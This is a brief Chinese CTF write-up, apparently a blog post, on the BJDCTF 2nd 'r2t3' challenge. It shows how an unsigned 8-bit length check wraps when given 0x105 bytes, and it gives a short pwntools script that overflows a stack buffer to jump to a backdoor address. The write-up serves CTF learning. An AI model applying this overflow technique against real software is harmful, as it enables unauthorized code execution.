        <p>做题遇到了，以后补一下先上个例题</p>
<h1 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="BJDCTF 2nd r2t3"></a>BJDCTF 2nd r2t3</h1><p>有一个长度的检查</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1590804787387-0eb3a93a-92da-4b8c-b0d5-949f4e137ce4.png#align=left&display=inline&height=261&margin=%5Bobject%20Object%5D&name=image.png&originHeight=282&originWidth=381&size=14339&status=done&style=stroke&width=352" alt="image.png"></p>
<p>这个 v3  是一个无符号数，最大只能 255，如果超过的话就会进行  mod 255<br>所以可以传入一个总共是 0x105 的，这样他的得到的就是 6  是符合长度限制的，从而绕过  if  的检测</p>
<p>dest  的大小是 0x11h，加上  ebp  的 0x4h，所以需要在前面填充 0x15h<br>程序中提供了后门 0x804858B</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1590805362613-efe9ceda-0e35-4cd2-bbc8-903e8d56dbc5.png#align=left&display=inline&height=269&margin=%5Bobject%20Object%5D&name=image.png&originHeight=389&originWidth=839&size=35739&status=done&style=stroke&width=580" alt="image.png"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'pwn'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x15</span>+p32(<span class="number">0x804858B</span>)</span><br><span class="line">payload+=<span class="string">'a'</span>*(<span class="number">0x105</span>-len(payload))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
